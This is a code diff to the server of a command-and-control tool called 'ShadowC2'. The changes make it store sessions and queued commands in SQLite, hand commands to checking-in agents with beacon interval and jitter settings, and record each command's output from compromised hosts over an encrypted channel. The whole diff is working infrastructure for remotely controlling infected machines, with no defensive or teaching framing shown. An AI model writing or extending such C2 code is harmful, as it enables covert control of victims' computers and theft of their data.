@@ -1,5 +1,5 @@
 """
-ShadowC2 - C2 Server (Simplified)
+ShadowC2 - C2 Server (Final Fixed Version)
 """
 
 import os
@@ -14,7 +14,7 @@ from colorama import init, Fore, Style
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from common.crypto import CryptoHandler
-from common.protocol import C2Message, validate_message
+from common.protocol import C2Message
 
 init(autoreset=True)
 
@@ -35,7 +35,6 @@ class C2Server:
         
         self.crypto = CryptoHandler(self.master_key)
         self.sessions = {}
-        self.command_queue = {}
         
         self.db_path = "c2_server.db"
         self.init_database()
@@ -88,8 +87,6 @@ class C2Server:
             "status": "active"
         }
         
-        self.command_queue[session_id] = []
-        
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
         cursor.execute('''
@@ -109,18 +106,52 @@ class C2Server:
         conn.commit()
         conn.close()
         
-        self.log(f"New session: {session_id} ({self.sessions[session_id]['hostname']})", "INFO")
+        self.log(f"New session: {session_id[:8]}... ({self.sessions[session_id]['hostname']})")
     
     def update_session(self, session_id):
         if session_id in self.sessions:
             self.sessions[session_id]["last_seen"] = int(time.time())
+            
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            cursor.execute("UPDATE sessions SET last_seen = ? WHERE session_id = ?", (int(time.time()), session_id))
+            conn.commit()
+            conn.close()
     
     def get_pending_commands(self, session_id):
-        if session_id not in self.command_queue:
+        """Get commands from database"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute(
+                "SELECT command_id, command FROM commands WHERE session_id = ? AND status = 'queued'",
+                (session_id,)
+            )
+            rows = cursor.fetchall()
+            
+            commands = []
+            for command_id, command_json in rows:
+                cmd_dict = json.loads(command_json)
+                commands.append(cmd_dict)
+                
+                # Mark as sent
+                cursor.execute(
+                    "UPDATE commands SET status = 'sent' WHERE command_id = ?",
+                    (command_id,)
+                )
+            
+            conn.commit()
+            conn.close()
+            
+            if commands:
+                self.log(f"Sending {len(commands)} command(s) to {session_id[:8]}...")
+            
+            return commands
+            
+        except Exception as e:
+            self.log(f"Error getting commands: {e}", "ERROR")
             return []
-        commands = self.command_queue[session_id].copy()
-        self.command_queue[session_id] = []
-        return commands
     
     def log(self, message, level="INFO"):
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -132,7 +163,7 @@ class C2Server:
         else:
             color = Fore.RED
         
-        print(f"{color}[{timestamp}] [{level}] {message}")
+        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
 
 c2_server = None
 
@@ -148,13 +179,7 @@ def handle_checkin():
         
         c2_server.register_session(msg.session_id, msg.data)
         
-        response = {
-            "status": "success",
-            "message": "Registered",
-            "beacon_interval": 60,
-            "jitter": 30
-        }
-        
+        response = {"status": "success", "beacon_interval": 60, "jitter": 30}
         encrypted_response = c2_server.crypto.encrypt(response)
         return jsonify({"data": encrypted_response}), 200
         
@@ -190,12 +215,27 @@ def handle_response():
         decrypted = c2_server.crypto.decrypt(encrypted_data)
         msg = C2Message.from_dict(decrypted)
         
+        command_id = msg.data.get('command_id')
         output = msg.data.get('output', '')
-        c2_server.log(f"Response from {session_id[:8]}...: {output[:100]}", "INFO")
+        success = msg.data.get('success', False)
         
-        print(f"\n{Fore.CYAN}[OUTPUT from {session_id[:8]}...]")
+        # Update database
+        conn = sqlite3.connect(c2_server.db_path)
+        cursor = conn.cursor()
+        cursor.execute(
+            "UPDATE commands SET status = ?, output = ? WHERE command_id = ?",
+            ("completed" if success else "failed", output, command_id)
+        )
+        conn.commit()
+        conn.close()
+        
+        c2_server.log(f"Response from {session_id[:8]}...")
+        
+        print(f"\n{Fore.CYAN}{'='*80}")
+        print(f"[OUTPUT from {session_id[:8]}...]")
+        print(f"{'='*80}")
         print(output)
-        print(f"{Style.RESET_ALL}")
+        print(f"{'='*80}{Style.RESET_ALL}\n")
         
         return jsonify({"status": "success"}), 200
         
